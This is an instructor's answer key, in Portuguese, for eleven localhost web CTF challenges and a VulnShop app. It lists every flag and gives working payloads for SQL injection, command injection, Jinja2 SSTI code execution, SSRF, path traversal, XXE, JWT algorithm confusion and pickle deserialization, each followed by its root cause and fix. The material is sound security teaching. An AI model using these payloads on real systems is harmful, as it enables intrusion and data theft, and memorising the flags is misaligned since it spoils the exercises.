# Gabarito — 11 CTFs Web + VulnShop

> Material do instrutor. Não distribua para os alunos.

## Resumo das flags

| # | Desafio | Nível | Flag |
|---|---------|-------|------|
| 01 | Cookie Monsters | fácil | `flag{c00k13s_s4o_cr0c4nt3s}` |
| 02 | SQLi Login | fácil | `flag{sq1_1nj3ct10n_b4s1c4}` |
| 03 | NotasWeb | fácil | `flag{1d0r_n0t4s_d0_adm1n}` |
| 04 | NetCheck | fácil | `flag{c0mm4nd_1nj3ct10n_b4s1c4}` |
| 05 | TemplateLab | médio | `flag{sst1_j1nj4_rce}` |
| 06 | URL Preview | médio | `flag{ssrf_r3d3_1nt3rn4}` |
| 07 | DocViewer | fácil | `flag{p4th_tr4v3rs4l_b4s1c4}` |
| 08 | ProfileHub | fácil | `flag{m4ss_4ss1gnm3nt_adm1n}` |
| 09 | ImportaXML | médio | `flag{xxe_f1l3_r34d}` |
| 10 | Admin API | difícil | `flag{jwt_4lg0r1thm_c0nfus10n}` |
| 11 | Session Store | difícil | `flag{p1ckl3_d3s3r14l1z4t10n}` |

### VulnShop — flags principais

| Desafio | Vulnerabilidade | Flag |
|---------|-----------------|------|
| Busca oculta | SQL Injection na busca | `flag{sql1_s3arch_h1dd3n}` |
| Frete sob demanda | Command Injection no cálculo de frete | `flag{cmdi_fr3t3_c4lc}` |
| Sessão de administrador | Cookie `shop_session` sem assinatura | `flag{c00k13s_r0l3_adm1n}` |
| Pedido alheio | IDOR em `/orders/<id>` | `flag{1d0r_0rd3r_1001}` |
| API de pedidos | BOLA em `/api/v1/orders/<id>` | `flag{b0l4_4p1_0rd3r_1003}` |
| Nota fiscal indiscreta | Path Traversal no download de nota | `flag{p4th_tr4v3rs4l_1nv01c3}` |

O passo a passo completo da VulnShop está em [`vulnshop/GABARITO.md`](./vulnshop/GABARITO.md).

## CTF 01 — Cookie Monsters

**Flag:** `flag{c00k13s_s4o_cr0c4nt3s}`

### Passo a passo

1. Acesse http://localhost:8001 e faça login com `guest` / `guest`.
2. No painel, o cookie `session` aparece na seção de depuração ou no DevTools.
3. O valor inicial é:

   ```text
   eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9
   ```

4. Decodificando:

   ```bash
   echo 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9' | base64 -d
   ```

   Resultado:

   ```json
   {"user":"guest","role":"user"}
   ```

5. Altere `role` para `admin` e codifique novamente:

   ```bash
   printf '%s' '{"user":"guest","role":"admin"}' | base64 -w0
   ```

   Resultado:

   ```text
   eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==
   ```

6. Substitua o cookie no navegador ou use `curl`:

   ```bash
   curl -s \
     -b 'session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==' \
     http://localhost:8001/dashboard | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{c00k13s_s4o_cr0c4nt3s}
   ```

### Causa raiz

O servidor usa o cookie apenas como `base64(JSON)` e confia no campo `role` enviado pelo cliente. Base64 não é assinatura nem criptografia: qualquer pessoa pode ler e alterar o conteúdo.

### Correção

- Assinar e/ou criptografar o cookie (por exemplo, usando a sessão do Flask, que assina os dados com `itsdangerous`).
- Não armazenar o papel (`role`) no cliente. Guardar apenas um identificador de sessão e consultar o papel no servidor.
- Invalidar a sessão no servidor ao fazer logout e definir `HttpOnly`, `Secure` e `SameSite`.

---

## CTF 02 — SQLi Login

**Flag:** `flag{sq1_1nj3ct10n_b4s1c4}`

### Passo a passo

A conta `guest` / `guest` é válida, mas não é administradora. A senha do `admin` é aleatória, então o caminho é a SQL Injection.

1. Payload no campo **usuário**:

   ```text
   admin' --
   ```

   Senha: qualquer valor.

2. Enviando via `curl`, guardando o cookie de sessão:

   ```bash
   curl -s -i \
     -X POST http://localhost:8002/login \
     --data-urlencode "username=admin' --" \
     --data-urlencode "password=qualquer" \
     -c /tmp/ctf02.cookies
   ```

3. Acessando o painel:

   ```bash
   curl -s \
     -b /tmp/ctf02.cookies \
     http://localhost:8002/admin | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{sq1_1nj3ct10n_b4s1c4}
   ```

4. Alternativa com condição sempre verdadeira:

   ```text
   ' OR 1=1 --
   ```

   A consulta retorna o primeiro usuário da tabela, que é o `admin`.

### Por que funciona

A aplicação monta a consulta por concatenação:

```sql
SELECT id, username, is_admin FROM users
WHERE username = '<usuário>' AND password = '<senha>';
```

Com `admin' --`, a consulta vira:

```sql
SELECT id, username, is_admin FROM users
WHERE username = 'admin' --' AND password = 'qualquer';
```

O `--` transforma o restante da linha em comentário, removendo a verificação de senha. Com `' OR 1=1 --`, a condição `WHERE` fica sempre verdadeira e a consulta retorna o primeiro registro, o `admin`.

O painel `/admin` só é liberado porque a aplicação usa o `username` do registro retornado para montar a sessão. Como o registro do `admin` foi retornado, a sessão recebe `user=admin`.

### Causa raiz

Entrada do usuário concatenada diretamente na consulta SQL, permitindo alterar a estrutura da consulta. Somam-se a isso a exibição de mensagens de erro do banco e a existência de um usuário administrador na mesma tabela de login.

### Correção

- Usar **prepared statements / queries parametrizadas**:

  ```python
  db.execute(
      "SELECT id, username, is_admin FROM users WHERE username = ? AND password = ?",
      (username, password),
  )
  ```

- Nunca montar SQL com `f-string`, `%`, `.format()` ou concatenação.
- Armazenar senhas com hash forte (Argon2id, bcrypt ou scrypt), nunca em texto puro.
- Não exibir detalhes de erros do banco para o usuário final.
- Aplicar menor privilégio no usuário do banco e validar/autorizar o acesso ao painel no servidor.
- Adicionar rate limiting e monitoramento de tentativas de login.

---

## CTF 03 — NotasWeb

**Flag:** `flag{1d0r_n0t4s_d0_adm1n}`

### Passo a passo

1. Acesse http://localhost:8003 e faça login com `guest` / `guest`.
2. A lista mostra a nota `#1`, acessível em `/notes/1`.
3. O ID está na URL. Altere para `/notes/2`:

   ```text
   http://localhost:8003/notes/2
   ```

4. A aplicação retorna a nota privada do administrador, incluindo a flag.

Via `curl`:

```bash
rm -f /tmp/ctf03.cookies

curl -s -X POST http://localhost:8003/login \
  --data 'username=guest&password=guest' \
  -c /tmp/ctf03.cookies

curl -s -b /tmp/ctf03.cookies \
  http://localhost:8003/notes/2 | grep -o 'flag{[^}]*}'
```

Saída:

```text
flag{1d0r_n0t4s_d0_adm1n}
```

### Causa raiz

O endpoint `/notes/<id>` verifica se o usuário está autenticado, mas não verifica se a nota pertence a ele. O ID é previsível e vem diretamente da URL, permitindo acesso horizontal a objetos de outro usuário (IDOR).

### Correção

- Validar a autorização em cada acesso: buscar a nota com `WHERE id = ? AND owner = ?` usando o usuário da sessão.
- Negar por padrão quando o recurso não pertence ao usuário.
- Usar identificadores não sequenciais (UUID) como defesa em profundidade, sem substituir a checagem de autorização.
- Adicionar testes automatizados de IDOR para os endpoints que recebem IDs.

---

## CTF 04 — NetCheck

**Flag:** `flag{c0mm4nd_1nj3ct10n_b4s1c4}`

### Passo a passo

1. Acesse http://localhost:8004.
2. Teste o encadeamento de comandos no campo de host:

   ```text
   localhost; id
   ```

   A saída mostra o resultado do `getent` e do `id`, confirmando a execução de comandos.

3. Leia a flag:

   ```text
   localhost; cat /tmp/flag.txt
   ```

4. Via `curl`:

   ```bash
   curl -s -X POST http://localhost:8004/ \
     --data-urlencode 'host=localhost; cat /tmp/flag.txt' \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{c0mm4nd_1nj3ct10n_b4s1c4}
   ```

### Por que funciona

O servidor monta o comando por concatenação e o executa com `shell=True`:

```python
command = f"getent hosts {host}"
subprocess.run(command, shell=True, ...)
```

Com `localhost; cat /tmp/flag.txt`, o shell executa dois comandos separados pelo `;`:

```text
getent hosts localhost
cat /tmp/flag.txt
```

### Causa raiz

Entrada do usuário concatenada em um comando interpretado por um shell, permitindo injetar metacaracteres (`;`, `&&`, `|`, `$()`, backticks etc.).

### Correção

- Não usar `shell=True`. Passar os argumentos como lista:

  ```python
  subprocess.run(["getent", "hosts", host], shell=False, ...)
  ```

- Validar a entrada com allowlist (por exemplo, aceitar apenas hostnames/IPs válidos).
- Executar comandos com o menor privilégio possível e sem segredos acessíveis no mesmo container.
- Aplicar defesa em profundidade: seccomp/AppArmor, filesystem somente leitura e isolamento de rede.

---

## CTF 05 — TemplateLab

**Flag:** `flag{sst1_j1nj4_rce}`

### Passo a passo

1. Acesse http://localhost:8005.
2. Teste a avaliação de expressões no campo de nome:

   ```text
   {{ 7 * 7 }}
   ```

   A pré-visualização mostra `49`, confirmando a SSTI.

3. Leia a flag usando o módulo `os` a partir dos globals do Jinja2:

   ```text
   {{ cycler.__init__.__globals__.os.popen('cat /tmp/flag.txt').read() }}
   ```

4. Via `curl`:

   ```bash
   curl -s -X POST http://localhost:8005/ \
     --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /tmp/flag.txt').read() }}" \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{sst1_j1nj4_rce}
   ```

### Por que funciona

A aplicação concatena a entrada do usuário ao código-fonte do template e o renderiza:

```python
preview = render_template_string("Olá, " + name + "! ...")
```

O Jinja2 avalia `{{ ... }}` antes de gerar a saída. A partir de objetos globais disponíveis no ambiente (`cycler`, `lipsum`, `joiner` etc.), é possível chegar ao módulo `os` e executar comandos no servidor.

### Causa raiz

Entrada do usuário interpretada como template Jinja2, sem sandbox. Isso permite execução de código no servidor e leitura de arquivos e variáveis de ambiente.

### Correção

- Nunca renderizar entrada do usuário como template. Passar o valor como variável em um template fixo:

  ```python
  return render_template("index.html", name=name)
  ```

- Se templates precisarem ser editáveis por usuários, usar um sandbox e uma allowlist restrita de variáveis e filtros.
- Evitar expor objetos internos do Python no ambiente de templates.
- Aplicar menor privilégio no processo e isolar segredos do container da aplicação.

---

## CTF 06 — URL Preview

**Flag:** `flag{ssrf_r3d3_1nt3rn4}`

### Passo a passo

O serviço `ctf06-flag-service` não tem porta publicada no host. Ele só pode ser alcançado pela rede Docker. O nome do serviço não é divulgado no briefing: ele precisa ser descoberto pela própria aplicação.

1. Acesse http://localhost:8006. A seção **Pré-visualizações recentes** mostra uma entrada interna:

   ```text
   http://flag-service:8000/health
   ```

   O hostname e a porta ficam expostos no histórico.

2. Alternativa de enumeração: acesse `http://localhost:8006/robots.txt`. Ele indica `Disallow: /debug`. O endpoint `/debug` retorna um JSON com o catálogo `internal_services`:

   ```json
   {
     "internal_services": {
       "flag-service": {
         "url": "http://flag-service:8000",
         "health": "http://flag-service:8000/health"
       }
     }
   }
   ```

3. Use o formulário para acessar a raiz do serviço interno:

   ```text
   http://flag-service:8000/
   ```

   A resposta informa que o recurso protegido está em `/flag`.

4. Agora busque a flag:

   ```text
   http://flag-service:8000/flag
   ```

   O servidor faz a requisição, recebe a flag e exibe o corpo da resposta.

5. Via `curl`:

   ```bash
   curl -s -X POST http://localhost:8006/ \
     --data-urlencode 'url=http://flag-service:8000/flag' \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{ssrf_r3d3_1nt3rn4}
   ```

6. O bloqueio de `localhost` e `127.0.0.1` não impede o acesso ao hostname interno `flag-service`.

### Por que funciona

A aplicação busca qualquer URL `http://` ou `https://` a partir do servidor. Como o backend está na mesma rede Docker que o serviço interno, ele consegue resolver `flag-service` e acessar a porta 8000. O navegador do aluno não tem acesso direto a esse serviço, mas o servidor tem.

### Causa raiz

SSRF: a aplicação permite que o usuário controle o destino de uma requisição feita pelo servidor. A validação por blocklist de strings é insuficiente e não há restrição de egresso para a rede interna.

### Correção

- Usar allowlist de domínios e esquemas permitidos.
- Resolver o DNS e bloquear faixas privadas, loopback e link-local após a resolução, não apenas por string.
- Revalidar o destino após cada redirecionamento ou desabilitar redirecionamentos.
- Aplicar políticas de egresso na rede (firewall/NetworkPolicy) para impedir que a aplicação alcance serviços internos desnecessários.
- Não manter segredos em serviços acessíveis pela mesma rede sem autenticação.
- Preferir um proxy de saída dedicado, com allowlist e sem acesso à rede interna.
- Não expor catálogos de serviços internos em endpoints de diagnóstico, históricos ou arquivos `robots.txt`.

---

## CTF 07 — DocViewer

**Flag:** `flag{p4th_tr4v3rs4l_b4s1c4}`

### Passo a passo

1. Acesse http://localhost:8007 e abra um documento. A URL fica no formato:

   ```text
   http://localhost:8007/download?file=readme.txt
   ```

2. O servidor concatena o valor de `file` ao diretório `/app/documents`. Use `../` para subir dois níveis e alcançar `/tmp`:

   ```text
   http://localhost:8007/download?file=../../tmp/flag.txt
   ```

3. Via `curl`:

   ```bash
   curl -s 'http://localhost:8007/download?file=../../tmp/flag.txt' \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{p4th_tr4v3rs4l_b4s1c4}
   ```

   Se o cliente normalizar o caminho, use a versão codificada:

   ```bash
   curl -s 'http://localhost:8007/download?file=%2e%2e%2f%2e%2e%2ftmp%2fflag.txt' \
     | grep -o 'flag{[^}]*}'
   ```

### Causa raiz

O caminho é montado com `os.path.join` usando o nome enviado pelo cliente, sem normalização nem verificação de que o resultado permanece dentro de `/app/documents`. A sequência `../` permite sair do diretório e ler qualquer arquivo acessível ao processo.

### Correção

- Resolver o caminho com `Path(...).resolve()` e verificar se ele está contido no diretório permitido:

  ```python
  base = DOCS_DIR.resolve()
  target = (base / filename).resolve()
  if not target.is_relative_to(base):
      abort(403)
  ```

- Preferir uma allowlist de nomes de arquivos ou mapear IDs para caminhos fixos.
- Não devolver mensagens de erro com o caminho completo do sistema.
- Executar o processo com o menor privilégio e sem acesso a segredos desnecessários.

---

## CTF 08 — ProfileHub

**Flag:** `flag{m4ss_4ss1gnm3nt_adm1n}`

### Passo a passo

1. Acesse http://localhost:8008 e faça login com `guest` / `guest`.
2. Abra o perfil. O formulário envia `name` e `email` para `POST /profile`.
3. Adicione o campo `role=admin` ao corpo da requisição. Via `curl`:

   ```bash
   rm -f /tmp/ctf08.cookies

   curl -s -X POST http://localhost:8008/login \
     --data 'username=guest&password=guest' \
     -c /tmp/ctf08.cookies

   curl -s -X POST http://localhost:8008/profile \
     -b /tmp/ctf08.cookies \
     --data 'name=Visitante&email=guest@example.com&role=admin'

   curl -s -b /tmp/ctf08.cookies \
     http://localhost:8008/admin | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{m4ss_4ss1gnm3nt_adm1n}
   ```

4. No navegador, também é possível adicionar um campo oculto `role=admin` pelo DevTools antes de enviar o formulário.

### Causa raiz

O endpoint `POST /profile` faz mass assignment: copia todos os campos de `request.form` para o registro do usuário. O cliente consegue alterar `role`, um campo que só deveria ser definido pelo servidor.

### Correção

- Fazer binding explícito apenas dos campos permitidos:

  ```python
  user["name"] = request.form.get("name", user["name"])
  user["email"] = request.form.get("email", user["email"])
  ```

- Nunca aceitar `role`, `is_admin`, `password` ou outros campos sensíveis do cliente.
- Definir o papel no servidor e validar a autorização em cada endpoint administrativo.
- Usar modelos/schemas com allowlist de campos (por exemplo, Pydantic ou Marshmallow) e testes de regressão.

---

## CTF 09 — ImportaXML

**Flag:** `flag{xxe_f1l3_r34d}`

### Passo a passo

1. Acesse http://localhost:8009 e observe o XML de exemplo.
2. Envie um documento com uma entidade externa apontando para a flag:

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE produto [
     <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
   ]>
   <produto>
     <nome>Teste</nome>
     <preco>0</preco>
     <descricao>&xxe;</descricao>
   </produto>
   ```

3. A página mostra o campo `descricao` com o conteúdo expandido da entidade.
4. Via `curl`, salvando o payload em `payload.xml`:

   ```bash
   curl -s -X POST http://localhost:8009/ \
     --data-urlencode 'xml@payload.xml' \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{xxe_f1l3_r34d}
   ```

### Causa raiz

O parser `lxml` é criado com `resolve_entities=True` e `load_dtd=True`, permitindo que uma entidade definida no documento leia arquivos locais. `no_network=True` bloqueia acesso de rede, mas não impede `file://`.

### Correção

- Desabilitar DTDs e entidades externas:

  ```python
  parser = etree.XMLParser(
      resolve_entities=False,
      load_dtd=False,
      no_network=True,
      huge_tree=False,
  )
  ```

- Preferir `defusedxml` ou bibliotecas com parser seguro por padrão.
- Rejeitar documentos com `DOCTYPE` quando ele não for necessário.
- Executar o parser com o menor privilégio e sem acesso a segredos no filesystem.

---

## CTF 10 — Admin API

**Flag:** `flag{jwt_4lg0r1thm_c0nfus10n}`

### Passo a passo

1. Acesse http://localhost:8010 e faça login com `guest` / `guest`.
2. O painel mostra o token JWT. Decodificando header e payload, temos:

   ```json
   {"alg":"RS256","typ":"JWT"}
   {"sub":"guest","role":"user"}
   ```

3. Baixe a chave pública:

   ```bash
   curl -s http://localhost:8010/pubkey -o pub.pem
   ```

4. O servidor aceita `RS256` e `HS256` usando a mesma chave. Assine manualmente um token `HS256` tendo o conteúdo do PEM como segredo HMAC:

   ```python
   import base64
   import hashlib
   import hmac
   import json


   def b64url(data: bytes) -> str:
       return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


   public_key = open("pub.pem", "rb").read()

   header = {"alg": "HS256", "typ": "JWT"}
   payload = {"sub": "guest", "role": "admin"}

   segments = [
       b64url(json.dumps(header, separators=(",", ":")).encode()),
       b64url(json.dumps(payload, separators=(",", ":")).encode()),
   ]
   signing_input = ".".join(segments).encode()
   signature = hmac.new(public_key, signing_input, hashlib.sha256).digest()
   token = ".".join(segments + [b64url(signature)])
   print(token)
   ```

   Muitas bibliotecas de JWT, como a PyJWT, bloqueiam o uso de um PEM como segredo HMAC justamente para evitar essa falha. Por isso o script assina o token manualmente com `hmac`.

5. Use o token forjado:

   ```bash
   TOKEN='<token gerado>'
   curl -s -H "Authorization: Bearer $TOKEN" \
     http://localhost:8010/admin | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{jwt_4lg0r1thm_c0nfus10n}
   ```

   Também é possível enviar o token no cookie `token`.

### Causa raiz

O servidor aceita os algoritmos `RS256` e `HS256` com a mesma chave de verificação. Como a chave pública é pública, um atacante pode usá-la como segredo HMAC e assinar um token `HS256` válido. O servidor não distingue o tipo de chave esperado para cada algoritmo.

### Correção

- Fixar o algoritmo esperado e nunca aceitar algoritmos simétricos quando a chave é assimétrica:

  ```python
  jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
  ```

- Usar chaves separadas para assinatura e verificação, com rotação e `kid` confiável.
- Validar `iss`, `aud`, `exp`, `nbf` e o papel no servidor, não apenas a assinatura.
- Preferir bibliotecas/configurações que não permitam misturar famílias de algoritmos.
- Não expor chaves desnecessariamente e aplicar menor privilégio aos tokens.

---

## CTF 11 — Session Store

**Flag:** `flag{p1ckl3_d3s3r14l1z4t10n}`

### Passo a passo

1. Acesse http://localhost:8011. O cookie `profile` contém base64 de um objeto `pickle`:

   ```bash
   echo 'gASV...' | base64 -d
   ```

   O conteúdo decodificado mostra o dicionário com `name` e `theme`.

2. Crie um payload que executa um comando durante a desserialização:

   ```python
   import base64
   import pickle
   import subprocess

   class RCE:
       def __reduce__(self):
           return (subprocess.check_output, (["cat", "/tmp/flag.txt"],))

   payload = base64.b64encode(pickle.dumps(RCE())).decode()
   print(payload)
   ```

3. Envie o valor no formulário **Restaurar backup** (`POST /restore`) ou defina o cookie `profile` com ele. O objeto retornado é o resultado do comando, exibido na página:

   ```text
   b'flag{p1ckl3_d3s3r14l1z4t10n}\n'
   ```

4. Via `curl`:

   ```bash
   PAYLOAD='<base64 gerado>'
   curl -s -X POST http://localhost:8011/restore \
     --data-urlencode "profile=$PAYLOAD" \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{p1ckl3_d3s3r14l1z4t10n}
   ```

### Causa raiz

O servidor chama `pickle.loads` em um valor controlado pelo cliente. `pickle` não é um formato de dados seguro: durante a desserialização, o método `__reduce__` de um objeto pode executar funções arbitrárias. O cookie e o endpoint de restauração expõem essa operação diretamente.

### Correção

- Nunca desserializar dados controlados pelo cliente com `pickle`.
- Usar formatos de dados sem execução de código, como JSON, e validar o schema.
- Se precisar de estado no cliente, usar cookies assinados (por exemplo, a sessão do Flask com `itsdangerous`) e manter dados sensíveis no servidor.
- Se `pickle` for inevitável, usar um `Unpickler` restrito com allowlist de classes e nunca aceitar payloads externos.
- Aplicar menor privilégio e manter segredos fora do alcance do processo da aplicação.

---

## VulnShop — aplicação integrada

A VulnShop está em http://localhost:8012 e tem guia próprio, com comandos `curl`, causa raiz e correção de cada falha:

- [`vulnshop/GABARITO.md`](./vulnshop/GABARITO.md)

Além das 6 flags principais, o guia cobre as falhas extras: XSS refletido na busca, open redirect no login, mass assignment no cadastro, CSRF nos formulários, senhas em texto puro e exposição da chave de API no perfil.
